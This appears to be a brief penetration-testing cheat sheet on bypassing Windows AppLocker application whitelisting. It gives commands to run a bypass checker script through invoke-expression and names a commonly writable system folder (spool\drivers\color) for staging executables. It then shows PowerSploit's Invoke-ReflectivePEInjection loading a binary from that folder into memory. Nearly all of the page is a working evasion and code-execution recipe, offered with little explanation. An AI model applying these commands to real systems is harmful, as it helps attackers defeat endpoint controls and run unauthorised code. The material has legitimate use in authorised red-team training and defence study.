# AppLocker bypass

## auto-checker-script

```bash
| update $group, $root_folder
# location: /opt/kashz-scripts/windows/appLocker-Bypass-Checker.ps1

Get-Content .\appLocker-Bypass-Checker.ps1 | out-string | invoke-expression
```

## More Paths ([link](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md))

```bash
# most commonly used
C:\windows\System32\spool\drivers\color
```

## Execute using `Invoke-ReflectivePEInjection.ps1`

NOTE: sometimes, have noticed this breaks the shell, other times it works.

```bash
# located at /usr/share/windows-resources/powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1 .

$ByteArray = [System.IO.File]::ReadAllBytes("C:\windows\System32\spool\drivers\color\FILE");

Invoke-expression(Get-Content .\Invoke-ReflectivePEInjection.ps1 |out-string)
Invoke-ReflectivePEInjection -PEBytes $ByteArray
```
